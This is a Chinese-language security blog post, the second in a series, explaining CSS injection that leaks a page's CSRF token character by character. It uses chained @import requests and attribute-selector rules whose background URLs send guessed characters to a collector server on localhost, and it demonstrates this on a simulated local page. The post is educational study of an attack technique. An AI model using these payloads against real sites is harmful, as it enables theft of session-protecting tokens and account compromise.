---
title: CSS 衍生的資安問題(中) - 不用 Hot Update 也行
---

在上篇裡面，Hackmd 被攻擊的條件是因為**容許使用者插入自訂義的 CSS** 以及**擁有熱更新的功能**所以才讓我們可以透過不同載入新樣式的方式達成攻擊的目的。

不過如過少了熱更新這樣子的功能，我們好像只能不停的刷新頁面，問題是像是 CSRF Token 這種每次刷新就換一組的資料就偷不到了，再者我們試圖插入 CSS 應該是沒辦法造成頁面自動刷新(或是筆者知道的太少...

## 即使沒有熱更新也能偷到東西

### 用 @import 讓所有請求一次發完

開門見山地說，我們需要用到 `@import`，我們可以再 Hackmd 的 note 這麼寫:

```css
<style>
    @import url(https://localhost:5000/payload?len=1)
    @import url(https://localhost:5000/payload?len=2)
    @import url(https://localhost:5000/payload?len=3)
    @import url(https://localhost:5000/payload?len=4)
    @import url(https://localhost:5000/payload?len=5)
    @import url(https://localhost:5000/payload?len=6)
    @import url(https://localhost:5000/payload?len=7)
    @import url(https://localhost:5000/payload?len=8)
</style>
```

至於每個 request 伺服器要回傳甚麼呢? `len=1` 的這個很明顯的就是要回傳

```css
// length1.css
meta[name="csrf-token"][content^="A"] {
	background: url('http://localhost:8100/cssinjection/A');
}
meta[name="csrf-token"][content^="B"] {
	background: url('http://localhost:8100/cssinjection/B');
}
meta[name="csrf-token"][content^="C"] {
	background: url('http://localhost:8100/cssinjection/C');
}
...
```

但問題是 len=1 到 len=8 的 request 都會一併送來，假設我們要偷的 Csrf Token 是 `ABC` 開頭的，當 len=1 回傳的 CSS 樣式被載入時我們的確可以收到 A，但是我們可以先將其他 len=2 ~ len=8 的 request 先擱著，等到收到 A 以後再讓 `len=2` 回傳

```css
// length2.css
meta[name="csrf-token"][content^="AA"] {
	background: url('http://localhost:8100/cssinjection/AA');
}
meta[name="csrf-token"][content^="AB"] {
	background: url('http://localhost:8100/cssinjection/AB');
}
meta[name="csrf-token"][content^=AC"] {
	background: url('http://localhost:8100/cssinjection/AC');
}
...
```

### Hold 住 request

要 hold 住 request 讓它不要馬上回傳是可行的嗎? 當然是可以的，在上一篇的範例裡頭我們會將 CsrfToken 一行一行寫入，我們可以利用這個特性，比如說偵測檔案寫到第二行時，代表已經偷到兩個位數，這樣一來 `len=3` 的 request 便可以利用當前偷倒的兩位數來產生三位數的 CSS 檔案並回傳。

這麼說有點難懂，可以看下面的 GIF:

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/bfd10fd015be3428.gif)

有讀者可能會發現上面的範例用了 port 5000 以及 port 8100 兩個 Server，會這麼做是因為瀏覽器對於一個 domain 能同時載入的 request 的數量有限制，所以如果全部都是用 同一個 domain 的話，會發現背景圖片的 request 送不出去，因為都被 CSS import 給卡住了。

## 再度攻擊 Hackmd

在[上一篇]()文章我們要用到 Hackmd 的 edit mode 才可以成功竊取 Csrf Token，但現在我們學會即使不支援熱更新也可以偷到 Csrf Token，馬上來試試吧

-----

### Hackmd 不支援 @import

我得老實說，我失敗了QAQ，去論壇查了一下結果看到疑似是開發人員的回答:

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/90e13da365298a38.png)

既然這樣只好自己 Demo 一下囉(苦笑

-----

### 在本地模擬

#### 模擬遭到攻擊的網頁

我們簡單模擬遭到攻擊的網頁:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="token" content="abc123">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="token" content="abc">
    <meta name="csrf-token" content="J7WTbOpV-CDVLTBfmZHsCPPFXmuvDXNstbUM">
    <title>Document</title>
    <style>
        head, meta {
            display: block;
        }
    </style>
    <style>@import url(http://localhost:5000/payload?len=1);</style>
    <style>@import url(http://localhost:5000/payload?len=2);</style>
    <style>@import url(http://localhost:5000/payload?len=3);</style>
    <style>@import url(http://localhost:5000/payload?len=4);</style>
    <style>@import url(http://localhost:5000/payload?len=5);</style>
    <style>@import url(http://localhost:5000/payload?len=6);</style>
    <style>@import url(http://localhost:5000/payload?len=7);</style>
    <style>@import url(http://localhost:5000/payload?len=8);</style>
    <style>@import url(http://localhost:5000/payload?len=9);</style>
    <style>@import url(http://localhost:5000/payload?len=10);</style>
    <style>@import url(http://localhost:5000/payload?len=11);</style>
    <style>@import url(http://localhost:5000/payload?len=12);</style>
    <style>@import url(http://localhost:5000/payload?len=13);</style>
    <style>@import url(http://localhost:5000/payload?len=14);</style>
    <style>@import url(http://localhost:5000/payload?len=15);</style>
    <style>@import url(http://localhost:5000/payload?len=16);</style>
    <style>@import url(http://localhost:5000/payload?len=17);</style>
    <style>@import url(http://localhost:5000/payload?len=18);</style>
    <style>@import url(http://localhost:5000/payload?len=19);</style>
    <style>@import url(http://localhost:5000/payload?len=20);</style>
    <style>@import url(http://localhost:5000/payload?len=21);</style>
    <style>@import url(http://localhost:5000/payload?len=22);</style>
    <style>@import url(http://localhost:5000/payload?len=23);</style>
    <style>@import url(http://localhost:5000/payload?len=24);</style>
    <style>@import url(http://localhost:5000/payload?len=25);</style>
    <style>@import url(http://localhost:5000/payload?len=26);</style>
    <style>@import url(http://localhost:5000/payload?len=27);</style>
    <style>@import url(http://localhost:5000/payload?len=28);</style>
    <style>@import url(http://localhost:5000/payload?len=29);</style>
    <style>@import url(http://localhost:5000/payload?len=30);</style>
    <style>@import url(http://localhost:5000/payload?len=31);</style>
    <style>@import url(http://localhost:5000/payload?len=32);</style>
    <style>@import url(http://localhost:5000/payload?len=33);</style>
    <style>@import url(http://localhost:5000/payload?len=34);</style>
    <style>@import url(http://localhost:5000/payload?len=35);</style>
    <style>@import url(http://localhost:5000/payload?len=36);</style>
</head>
<body>
    <div>CSS Injection Demo</div>
</body>
</html>
```

因為我們要偷 meta 存放的 Csrf Token，所以一定要讓 head 還有 meta 都是 `display: block`，同時因為 Csrf Token 有 36 碼，所以要先準備 len=1 ~ len=36 的 request 來要 36 個 CSS 檔案。

#### 寫提供 CSS 的 Server

我們先寫 CSS Server，先上程式碼:

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/3b10f41aa8846544.png)

第三行到第 15 行我們定義了 `/payload` 這個路由，不過這個路由到底是怎麼製作 CSS 的呢? 讓我們再看到 createStyles 這個函式：

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/d041344c81f480b4.png)

第 22 到第 35 行的地方是針對 `len=1` 的情況，因為這個 request 不用被 hold，所以在第 26 到 31 行的地方，我們慢慢地把所有一個字母的可能性都寫進 CSS 檔案裡面並回傳。

至於其他 len=2 到 len=36 的 request 都要先 hold 住，比如說 len=30 的 request 要等到偷到 29 個位數的 Csrf Token 後才會根據這 29 位數產生 CSS 並送出。

那我們要如何得知偷 Token 的進度呢? 還記得**我們會把偷到的 Csrf Token 給一行一行寫到 csrf.txt 裏頭**嗎? 其實我們只要**監聽 csrf.txt 的變化**並且看目前有幾行便知道偷到哪裡了，同時也得知目前偷到的值。

第 38 行的地方開始監聽 csrf.txt 的變化，第 40 與第 41 將檔案內容讀出來計算行數並抓出最新的一行，接著在第 42 到第 58 行的地方先判斷是不是已經偷到了足夠的位數，以 len = 29 為例，如果已經偷到 28 位便可以根據這 28 位開始製作 CSS，否則就甚麼事也別做~

最後可以注意到第 43 行的地方 `watcher.close()`，因為預設一次最多只能同時存在 11 個監聽器，所以已經回傳 CSS 的監聽器便可以先關掉。

#### 寫收取並寫入 Csrf Token 的 Server

剛剛的 Server 是提供樣式的，那麼負責偷取與寫入的 Server 在哪呢? 別急現在就上程式碼:

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/17311eed6f2065de.png)

重點是第 11 行到第 15 行，把路由當中偷到的 Csrf Token 抓出來並寫到 csrf.txt 裏頭。

## 後記

CSS Injection 好像只能偷到 tag 裡面的 attribute 嘻嘻，如果寫在 text node 裡面就偷不到了吧? 比如說 `<div>I am token</div>`， CSS 選擇器的確選不到 text node，不過還是有辦法的喔! 最終章拭目以待吧(笑










